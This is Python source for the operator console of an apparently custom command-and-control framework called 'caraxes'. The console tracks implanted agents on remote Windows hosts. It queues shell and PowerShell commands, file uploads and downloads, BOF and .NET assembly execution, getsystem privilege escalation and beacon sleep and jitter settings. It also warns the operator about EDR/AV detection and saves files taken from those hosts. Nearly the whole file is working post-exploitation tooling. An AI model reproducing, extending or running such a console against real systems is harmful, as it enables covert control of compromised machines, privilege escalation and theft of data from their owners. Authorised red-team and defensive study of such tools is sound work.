"""
Interactive operator shell built on prompt_toolkit.

State machine with two contexts:
  - main: global commands (agents, listeners, modules, interact)
  - agent: agent-specific commands + module execution
"""

import asyncio
import logging
import shlex
from datetime import datetime
from pathlib import Path
from typing import Optional

from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import FormattedText
from prompt_toolkit.history import FileHistory
from prompt_toolkit.patch_stdout import patch_stdout
from rich.console import Console



from .completer import ShellCompleter
from .themes import get_banner
from .commands.agents import cmd_agents
from .commands.listeners import cmd_listeners_list
from .commands.modules import cmd_modules_list, cmd_modules_search, cmd_module_help
from .commands.help import cmd_help
from .commands.generate import cmd_generate

from ..core.session_manager import SessionManager, AgentSession
from ..core.task_manager import TaskManager
from ..core.module_registry import (
    ModuleRegistry, ModuleNotFoundError, IncompatibleError,
    ArgumentError, UserCancelled,
)
from ..core.events import event_bus, EventBus
from ..formatters.table import OutputParser
from ..listeners.base import BaseListener
from ..logging.operator_logger import OperatorLogger
from ..protocol.commands import TaskType

log = logging.getLogger(__name__)
# Write to stderr to bypass prompt_toolkit's patch_stdout which corrupts
# ANSI escape sequences when writing to stdout during prompt_async.
console = Console(stderr=True)


class OperatorShell:
    """
    Interactive prompt_toolkit shell for the operator client.
    """

    def __init__(
        self,
        session_manager: SessionManager,
        task_manager: TaskManager,
        module_registry: ModuleRegistry,
        logger: OperatorLogger,
        history_file: Path = Path("./logs/.shell_history"),
    ):
        self.session_manager = session_manager
        self.task_manager = task_manager
        self.module_registry = module_registry
        self.logger = logger
        self.output_parser = OutputParser()

        self._context = "main"
        self._current_agent: Optional[AgentSession] = None
        self._listeners: dict[int, BaseListener] = {}
        self._running = True

        self._completer = ShellCompleter(module_registry, session_manager)

        history_file.parent.mkdir(parents=True, exist_ok=True)
        self._session = PromptSession(
            history=FileHistory(str(history_file)),
            completer=self._completer,
            complete_while_typing=True,
        )

        # Register event handlers
        event_bus.on(EventBus.AGENT_CHECKIN, self._on_agent_checkin)
        event_bus.on(EventBus.TASK_RESULT, self._on_task_result)

    def register_listener(self, listener: BaseListener):
        self._listeners[listener.listener_id] = listener

    def _get_prompt(self) -> FormattedText:
        if self._context == "main":
            return FormattedText([
                ("fg:ansired bold", "caraxes"),
                ("fg:ansibrightblack", " > "),
            ])

        agent = self._current_agent
        if not agent:
            return FormattedText([
                ("fg:ansired bold", "caraxes"),
                ("fg:ansibrightblack", " > "),
            ])

        # Integrity color — SYSTEM gets magenta, HIGH gets red
        int_style = "fg:ansiyellow"
        if agent.integrity == "SYSTEM":
            int_style = "fg:ansibrightmagenta bold"
        elif agent.integrity == "HIGH":
            int_style = "fg:ansired bold"

        return FormattedText([
            ("fg:ansired bold", "caraxes"),
            ("fg:ansibrightblack", " ("),
            ("fg:ansiwhite bold", f"{agent.hostname}"),
            ("fg:ansibrightblack", ") "),
            ("fg:ansibrightyellow", f"{agent.username}"),
            ("fg:ansibrightblack", " ["),
            (int_style, f"{agent.integrity}"),
            ("fg:ansibrightblack", "] "),
            ("fg:ansicyan", f"{agent.cwd}"),
            ("fg:ansibrightblack", " > "),
        ])

    async def run(self):
        """Main shell loop."""
        console.print(get_banner())
        console.print()

        # Startup info block — Sliver-style with bullet markers
        num_modules = len(self.module_registry.modules)
        num_listeners = len(self._listeners)
        console.print(f"  [bold bright_red]Jobs:[/bold bright_red] {num_listeners} listeners running")
        console.print(f"  [bold bright_red]Modules:[/bold bright_red] {num_modules} loaded")
        for lid, listener in self._listeners.items():
            info = listener.info()
            status = info["status"]
            s_style = "bold green" if status == "RUNNING" else "bold red"
            console.print(
                f"    [{s_style}]►[/{s_style}] {info['type']} "
                f"on {info.get('interface', '0.0.0.0')}:{info.get('port', '')} "
                f"[{s_style}]{status}[/{s_style}]"
            )
        console.print()

        while self._running:
            try:
                with patch_stdout():
                    text = await self._session.prompt_async(
                        self._get_prompt,
                    )

                text = text.strip()
                if not text:
                    continue

                if self._context == "main":
                    await self._handle_main(text)
                elif self._context == "agent":
                    await self._handle_agent(text)

            except KeyboardInterrupt:
                continue
            except EOFError:
                self._running = False
                break
            except Exception as e:
                console.print(f"[bold red]Error:[/] {e}")
                log.error(f"Shell error: {e}", exc_info=True)

        console.print("[*] Shutting down...", style="yellow")

    async def _handle_main(self, text: str):
        """Handle commands in main context."""
        parts = shlex.split(text)
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd == "help":
            cmd_help("main")

        elif cmd == "agents":
            cmd_agents(self.session_manager)

        elif cmd == "interact":
            if not args:
                console.print("[red]Usage: interact <agent_id>[/red]")
                return
            try:
                display_id = int(args[0])
            except ValueError:
                console.print("[red]Agent ID must be a number.[/red]")
                return
            agent = self.session_manager.get_by_display_id(display_id)
            if not agent:
                console.print(f"[red]No agent with ID {display_id}.[/red]")
                return
            self._current_agent = agent
            self._context = "agent"
            self._completer.context = "agent"
            console.print(
                f"[bright_red][*][/bright_red] Active session: "
                f"[bold white]{agent.hostname}[/bold white] "
                f"([bright_yellow]{agent.username}[/bright_yellow])"
            )

        elif cmd == "listeners":
            if not args or args[0] == "list":
                cmd_listeners_list(self._listeners)
            elif args[0] == "start":
                console.print("[dim]Listener start requires configuration.[/dim]")
            elif args[0] in ("stop", "kill"):
                if len(args) < 2:
                    console.print("[red]Usage: listeners stop <id>[/red]")
                    return
                try:
                    lid = int(args[1])
                except ValueError:
                    console.print("[red]Listener ID must be a number.[/red]")
                    return
                listener = self._listeners.get(lid)
                if listener:
                    await listener.stop()
                    console.print(f"[yellow]Listener {lid} stopped.[/yellow]")
                else:
                    console.print(f"[red]No listener with ID {lid}.[/red]")
            else:
                console.print(f"[red]Unknown listeners subcommand: {args[0]}[/red]")

        elif cmd == "modules":
            if not args or args[0] == "list":
                cmd_modules_list(self.module_registry)
            elif args[0] == "search" and len(args) > 1:
                cmd_modules_search(self.module_registry, " ".join(args[1:]))
            else:
                console.print("[red]Usage: modules [list|search <query>][/red]")

        elif cmd == "generate":
            args_str = " ".join(args) if args else ""
            project_root = Path(__file__).parent.parent.parent
            cmd_generate(args_str, project_root, list(self._listeners.values()))

        elif cmd == "exit":
            self._running = False

        else:
            console.print(f"[red]Unknown command: {cmd}. Type 'help' for commands.[/red]")

    async def _handle_agent(self, text: str):
        """Handle commands in agent context."""
        parts = shlex.split(text)
        cmd = parts[0].lower()
        args = parts[1:]
        agent = self._current_agent

        if cmd == "back":
            self._current_agent = None
            self._context = "main"
            self._completer.context = "main"
            return

        if cmd == "help":
            if args:
                mod = self.module_registry.get(args[0])
                if mod:
                    cmd_module_help(mod)
                else:
                    console.print(f"[red]Unknown module: {args[0]}[/red]")
            else:
                cmd_help("agent")
            return

        if cmd == "info":
            self._show_agent_info(agent)
            return

        if cmd == "modules":
            if not args or args[0] == "list":
                cmd_modules_list(self.module_registry)
            elif args[0] == "search" and len(args) > 1:
                cmd_modules_search(self.module_registry, " ".join(args[1:]))
            return

        if cmd == "sleep":
            if not args:
                console.print("[red]Usage: sleep <seconds> [jitter%][/red]")
                return
            try:
                interval = int(args[0])
                jitter = int(args[1].rstrip("%")) if len(args) > 1 else agent.jitter_percent
            except ValueError:
                console.print("[red]Invalid sleep/jitter value.[/red]")
                return
            agent.sleep_interval = interval
            agent.jitter_percent = jitter
            self.task_manager.create_task(
                agent, TaskType.CONFIG, "sleep",
                arguments=f"{interval}:{jitter}".encode(),
            )
            console.print(f"[green]Sleep set to {interval}s (jitter {jitter}%)[/green]")
            return

        if cmd == "clear":
            count = self.task_manager.clear_pending(agent)
            console.print(f"[yellow]Cleared {count} pending tasks.[/yellow]")
            return

        if cmd == "tasks":
            self._show_tasks(agent)
            return

        if cmd == "exit":
            console.print("[bold red]Kill agent process? (y/N)[/bold red]")
            confirm = await self._session.prompt_async(
                FormattedText([("", "confirm> ")]),
            )
            if confirm.strip().lower() in ("y", "yes"):
                self.task_manager.create_task(agent, TaskType.EXIT, "exit")
                console.print("[red]Exit task queued.[/red]")
                self._current_agent = None
                self._context = "main"
                self._completer.context = "main"
            return

        if cmd in ("shell", "powershell"):
            console.print(
                f"[bold red]WARNING: '{cmd}' spawns a child process. "
                f"Detectable by EDR/AV. Continue? (y/N)[/bold red]"
            )
            confirm = await self._session.prompt_async(
                FormattedText([("", "confirm> ")]),
            )
            if confirm.strip().lower() not in ("y", "yes"):
                return
            shell_cmd = " ".join(args)
            self.task_manager.create_task(
                agent, TaskType.NATIVE, cmd,
                arguments=shell_cmd.encode(),
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                cmd, {"command": shell_cmd},
            )
            console.print(f"[yellow]Task queued: {cmd} {shell_cmd}[/yellow]")
            return

        if cmd == "upload":
            if len(args) < 2:
                console.print("[red]Usage: upload <local> <remote>[/red]")
                return
            local_path = Path(args[0])
            if not local_path.exists():
                console.print(f"[red]Local file not found: {local_path}[/red]")
                return
            payload = local_path.read_bytes()
            remote_path = args[1]
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "upload",
                payload=payload,
                arguments=remote_path.encode(),
            )
            size = len(payload)
            console.print(f"[green]Upload queued: {local_path.name} ({size}B) -> {remote_path}[/green]")
            return

        if cmd == "download":
            if not args:
                console.print("[red]Usage: download <remote> [local][/red]")
                return
            remote_path = args[0]
            local_save = args[1] if len(args) > 1 else ""
            # Store the intended local path so we can use it when result arrives
            task = self.task_manager.create_task(
                agent, TaskType.NATIVE, "download",
                arguments=remote_path.encode(),
            )
            task._download_remote = remote_path
            task._download_local = local_save
            console.print(f"[green]Download queued: {remote_path}[/green]")
            return

        if cmd == "bof":
            if not args:
                console.print("[red]Usage: bof <path.o> [args...][/red]")
                return
            bof_path = Path(args[0])
            if not bof_path.exists():
                console.print(f"[red]BOF file not found: {bof_path}[/red]")
                return
            payload = bof_path.read_bytes()
            bof_args = " ".join(args[1:]) if len(args) > 1 else ""
            self.task_manager.create_task(
                agent, TaskType.BOF, bof_path.stem,
                payload=payload,
                arguments=bof_args.encode() if bof_args else b"",
            )
            console.print(f"[green]BOF queued: {bof_path.name} ({len(payload)}B)[/green]")
            return

        if cmd == "assembly":
            if not args:
                console.print("[red]Usage: assembly <path.exe> [args...][/red]")
                return
            asm_path = Path(args[0])
            if not asm_path.exists():
                console.print(f"[red]Assembly not found: {asm_path}[/red]")
                return
            payload = asm_path.read_bytes()
            asm_args = " ".join(args[1:]) if len(args) > 1 else ""
            self.task_manager.create_task(
                agent, TaskType.ASSEMBLY, asm_path.stem,
                payload=payload,
                arguments=asm_args.encode() if asm_args else b"",
            )
            console.print(f"[green]Assembly queued: {asm_path.name} ({len(payload)}B)[/green]")
            return

        if cmd == "cd":
            cd_path = " ".join(args) if args else ""
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "cd",
                arguments=cd_path.encode() if cd_path else b"",
            )
            console.print(f"[green]Task queued: cd {cd_path}[/green]")
            return

        # Native agent modules (built into agent binary, no module.yaml)
        native_modules = {
            "whoami": {"desc": "Current user, privileges, groups", "args": False},
            "ps": {"desc": "List running processes", "args": False},
            "ls": {"desc": "Directory listing", "args": True},
            "cat": {"desc": "Read file contents", "args": True},
            "rev2self": {"desc": "Revert to process token", "args": False},
        }
        if cmd in native_modules:
            native_args = " ".join(args) if args else ""
            self.task_manager.create_task(
                agent, TaskType.NATIVE, cmd,
                arguments=native_args.encode() if native_args else b"",
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                cmd, {"args": native_args},
            )
            console.print(f"[green]Task queued: {cmd}[/green]")
            return

        # Try as a registered module (BOF/Assembly with module.yaml)
        mod = self.module_registry.get(cmd)
        if mod:
            self._execute_module(agent, cmd, args)
            return

        console.print(f"[red]Unknown command or module: {cmd}[/red]")

    def _execute_module(self, agent, module_name, raw_args):
        """Parse module arguments and dispatch."""
        parsed_args = {}
        i = 0
        while i < len(raw_args):
            if raw_args[i].startswith("--"):
                key = raw_args[i][2:]
                if i + 1 < len(raw_args) and not raw_args[i + 1].startswith("--"):
                    parsed_args[key] = raw_args[i + 1]
                    i += 2
                else:
                    parsed_args[key] = "true"
                    i += 1
            else:
                i += 1

        def confirm_opsec(name, notes):
            console.print(f"[bold red]OPSEC WARNING:[/bold red] {name} is HIGH risk.\n  {notes}")
            resp = input("Continue? (y/N) ")
            return resp.strip().lower() in ("y", "yes")

        try:
            task = self.module_registry.dispatch(
                agent, module_name, parsed_args,
                confirm_opsec=confirm_opsec,
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                module_name, parsed_args,
            )
            console.print(f"[green]Task queued: {module_name} (id: {task.task_id[:8]})[/green]")
        except ModuleNotFoundError as e:
            console.print(f"[red]{e}[/red]")
        except IncompatibleError as e:
            console.print(f"[red]Compatibility error: {e}[/red]")
        except ArgumentError as e:
            console.print(f"[red]{e}[/red]")
        except UserCancelled:
            console.print("[yellow]Cancelled.[/yellow]")

    def _show_agent_info(self, agent):
        """Display detailed agent info."""
        info_lines = [
            f"Agent ID:      {agent.agent_id}",
            f"Display ID:    {agent.display_id}",
            f"Hostname:      {agent.hostname}",
            f"Username:      {agent.username}",
            f"PID:           {agent.pid}",
            f"PPID:          {agent.ppid}",
            f"Process:       {agent.process_name}",
            f"Architecture:  {agent.arch}",
            f"OS:            {agent.os_version}",
            f".NET Version:  {agent.dotnet_version}",
            f"Integrity:     {agent.integrity}",
            f"Is Admin:      {agent.is_admin}",
            f"C2 Channel:    {agent.c2_channel}",
            f"Sleep:         {agent.sleep_interval}s (jitter {agent.jitter_percent}%)",
            f"CWD:           {agent.cwd}",
            f"Agent Version: {agent.agent_version}",
            f"First Seen:    {agent.first_seen.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Last Seen:     {agent.last_seen.strftime('%Y-%m-%d %H:%M:%S')} ({agent.last_seen_ago} ago)",
            f"Pending Tasks: {len(agent.pending_tasks)}",
            f"Active Tasks:  {len(agent.active_tasks)}",
            f"Completed:     {len(agent.completed_tasks)}",
        ]
        _print("\n".join(info_lines))
        _print("")

    def _show_tasks(self, agent):
        """Display pending, active, and completed tasks for the agent."""
        # Pending
        if agent.pending_tasks:
            _print("\n  Pending Tasks")
            _print(f"  {'Module':<20} {'Type':<10} {'Created':<10} ID")
            _print(f"  {'-'*20} {'-'*10} {'-'*10} {'-'*8}")
            for task in agent.pending_tasks:
                _print(f"  {task.module_name:<20} {task.task_type.name:<10} "
                       f"{task.created_at.strftime('%H:%M:%S'):<10} {task.task_id[:8]}")
        else:
            _print("  No pending tasks.")

        # Active (sent, awaiting result)
        if agent.active_tasks:
            _print("\n  Active Tasks")
            _print(f"  {'Module':<20} {'Type':<10} {'Sent':<10} {'Elapsed':<10} ID")
            _print(f"  {'-'*20} {'-'*10} {'-'*10} {'-'*10} {'-'*8}")
            for task in agent.active_tasks.values():
                elapsed = ""
                if task.sent_at:
                    secs = (datetime.utcnow() - task.sent_at).total_seconds()
                    elapsed = f"{int(secs)}s"
                sent = task.sent_at.strftime("%H:%M:%S") if task.sent_at else "?"
                _print(f"  {task.module_name:<20} {task.task_type.name:<10} "
                       f"{sent:<10} {elapsed:<10} {task.task_id[:8]}")
        else:
            _print("  No active tasks.")

        # Completed (last 20)
        completed = agent.completed_tasks[-20:]
        if completed:
            _print(f"\n  Completed Tasks (last {len(completed)})")
            _print(f"  {'Module':<20} {'Status':<10} {'Completed':<10} {'Duration':<10} ID")
            _print(f"  {'-'*20} {'-'*10} {'-'*10} {'-'*10} {'-'*8}")
            for task in reversed(completed):
                duration = ""
                if task.sent_at and task.completed_at:
                    dur = (task.completed_at - task.sent_at).total_seconds()
                    duration = f"{dur:.1f}s"
                comp = task.completed_at.strftime("%H:%M:%S") if task.completed_at else "?"
                _print(f"  {task.module_name:<20} {task.status.name:<10} "
                       f"{comp:<10} {duration:<10} {task.task_id[:8]}")
        else:
            _print("  No completed tasks.")

    def _invalidate_prompt(self):
        """Force prompt redraw so dynamic metadata (user, integrity) updates live."""
        try:
            app = self._session.app
            if app is not None:
                app.invalidate()
        except Exception:
            pass  # No running app — nothing to invalidate

    def _on_agent_checkin(self, session, is_new):
        """Event handler for agent check-ins."""
        if is_new:
            _print(
                f"\n[*] Session #{session.display_id} opened -> "
                f"{session.hostname} ({session.username}) "
                f"- {session.os_version} - {session.arch} "
                f"[{session.integrity}] PID:{session.pid}"
            )
        # Refresh prompt if the current agent's metadata changed
        if self._current_agent and self._current_agent.agent_id == session.agent_id:
            self._invalidate_prompt()

    def _on_task_result(self, session, task):
        """Event handler for task results."""
        marker = "\033[91m[*]\033[0m" if task.status.name == "COMPLETE" else "\033[91m[!]\033[0m"
        if not (task.result and task.result.raw):
            _print(f"\n{marker} Result from {session.hostname} ({task.module_name}): (no output)")
            return

        # Update prompt immediately for impersonation changes
        if task.status.name == "COMPLETE":
            text_preview = task.result.raw.decode("utf-8", errors="replace")
            if task.module_name == "getsystem" and "SUCCESS" in text_preview:
                # Save original identity so rev2self can restore it
                if not hasattr(session, "_original_username"):
                    session._original_username = session.username
                    session._original_integrity = session.integrity
                session.username = "NT AUTHORITY\\SYSTEM"
                session.integrity = "SYSTEM"
                self._invalidate_prompt()
            elif task.module_name == "rev2self" and "Reverted" in text_preview:
                if hasattr(session, "_original_username"):
                    session.username = session._original_username
                    session.integrity = session._original_integrity
                    del session._original_username
                    del session._original_integrity
                self._invalidate_prompt()

        # Handle cd specially — update agent CWD from result
        if task.module_name == "cd" and task.status.name == "COMPLETE":
            new_cwd = task.result.raw.decode("utf-8", errors="replace").strip()
            if new_cwd and not new_cwd.startswith("cd:"):
                session.cwd = new_cwd
                _print(f"\n{marker} {session.hostname}: {new_cwd}")
            else:
                _print(f"\n{marker} {session.hostname}: {new_cwd}")
            return

        # Handle download — save file to disk
        if task.module_name == "download" and task.status.name == "COMPLETE":
            data = task.result.raw
            if not data:
                _print(f"\n[!] Download failed: empty response")
                return
            remote_path = getattr(task, "_download_remote", "unknown")
            local_override = getattr(task, "_download_local", "")
            if local_override:
                save_path = Path(local_override)
            else:
                dl_dir = Path("downloads")
                dl_dir.mkdir(exist_ok=True)
                filename = remote_path.replace("\\", "/").rsplit("/", 1)[-1] or "download"
                save_path = dl_dir / f"{session.hostname}_{filename}"
            save_path.parent.mkdir(parents=True, exist_ok=True)
            save_path.write_bytes(data)
            size_kb = len(data) / 1024
            _print(f"\n{marker} Downloaded {remote_path} from {session.hostname}")
            _print(f"    Saved: {save_path.resolve()} ({size_kb:.1f} KB)")
            return

        _print(f"\n{marker} Result from {session.hostname} ({task.module_name}):")
        mod = self.module_registry.get(task.module_name)
        if mod:
            try:
                output = self.output_parser.parse(mod, task.result.raw)
                if output.error:
                    _print(f"[!] Error: {output.error}")
                elif output.raw_rows:
                    _print_table(mod.columns, output.raw_rows)
                elif output.text:
                    _print(output.text)
                elif output.file_data:
                    nbytes = len(output.file_data)
                    _print(f"[*] File data received: {nbytes} bytes")
                else:
                    # Parser returned empty — show raw
                    _print(task.result.raw.decode("utf-8", errors="replace"))
            except (ValueError, Exception):
                # Parse failed (e.g. plain-text diagnostics, not TLV) — show raw
                _print(task.result.raw.decode("utf-8", errors="replace"))
        else:
            text = task.result.raw.decode("utf-8", errors="replace")
            formatter = _NATIVE_FORMATTERS.get(task.module_name)
            if formatter:
                formatter(text)
            else:
                _print(text)


# ─── Plain-text output helpers (bypass Rich to avoid ANSI corruption) ──


def _print(text: str):
    """Write plain text to stderr (avoids prompt_toolkit's patch_stdout)."""
    import sys
    sys.stderr.write(text + "\n")
    sys.stderr.flush()


def _print_table(columns: list, rows: list):
    """Render a plain-text aligned table to stderr."""
    if not rows:
        _print("  (no data)")
        return
    # Calculate column widths
    widths = {col: len(col) for col in columns}
    for row in rows:
        for col in columns:
            val = str(row.get(col, ""))
            widths[col] = max(widths[col], len(val))
    # Header — styled
    header = "  ".join(col.upper().ljust(widths[col]) for col in columns)
    _print(f"\033[91m  {header}\033[0m")
    _print(f"\033[90m  {'  '.join('─' * widths[col] for col in columns)}\033[0m")
    # Rows
    for row in rows:
        line = "  ".join(str(row.get(col, "")).ljust(widths[col]) for col in columns)
        _print(f"  {line}")


def _fmt_whoami(text: str):
    """Format whoami as clean raw text — no panels, no ANSI."""
    lines = text.splitlines()
    section = "info"
    _print("")
    for line in lines:
        stripped = line.strip()
        if stripped.startswith("=== PRIVILEGES ==="):
            section = "privs"
            _print("  Privileges")
            _print("  " + "-" * 58)
            continue
        elif stripped.startswith("=== GROUP MEMBERSHIP ==="):
            section = "groups"
            _print("")
            _print("  Groups")
            _print("  " + "-" * 58)
            continue
        if section == "info":
            if ":" in stripped and stripped:
                key, _, val = stripped.partition(":")
                _print(f"  {key.strip():<14} {val.strip()}")
        elif section == "privs":
            if stripped:
                parts = stripped.rsplit(None, 1)
                if len(parts) == 2:
                    name, status = parts
                    _print(f"    {name:<45} {status}")
        elif section == "groups":
            if stripped:
                _print(f"    {stripped}")
    _print("")


def _fmt_ps(text: str):
    """Format ps as clean aligned text."""
    lines = text.strip().splitlines()
    if not lines:
        _print("  No processes returned.")
        return
    _print("")
    _print(f"  {'PID':>6}  {'PPID':>6}  {'SID':>4}  Name")
    _print(f"  {'------':>6}  {'------':>6}  {'----':>4}  {'----'}")
    for line in lines:
        if line.startswith("PID") or line.startswith("──"):
            continue
        fields = line.split(None, 3)
        if len(fields) >= 4:
            _print(f"  {fields[0]:>6}  {fields[1]:>6}  {fields[2]:>4}  {fields[3]}")
        elif fields:
            _print(f"  {'':>6}  {'':>6}  {'':>4}  {fields[0]}")
    _print("")


def _fmt_ls(text: str):
    """Format ls as clean aligned text."""
    lines = text.strip().splitlines()
    if not lines:
        _print("  Empty directory.")
        return
    _print("")
    _print(f"  {'TYPE':<5}  {'MODIFIED':<20}  {'SIZE':>12}  NAME")
    _print(f"  {'-----':<5}  {'--------------------':<20}  {'------------':>12}  {'----'}")
    for line in lines:
        if line.startswith("TYPE") or line.startswith("──"):
            continue
        parts = line.split(None, 4)
        if len(parts) >= 5:
            ftype, date, time, size, name = parts
            _print(f"  {ftype:<5}  {date + ' ' + time:<20}  {size:>12}  {name}")
        else:
            fields = line.split(None, 3)
            if len(fields) >= 4:
                _print(f"  {fields[0]:<5}  {fields[1]:<20}  {fields[2]:>12}  {fields[3]}")
            elif fields:
                _print(f"  {'':5}  {'':20}  {'':12}  {fields[0]}")
    _print("")


_NATIVE_FORMATTERS = {
    "whoami": _fmt_whoami,
    "ps": _fmt_ps,
    "ls": _fmt_ls,
}
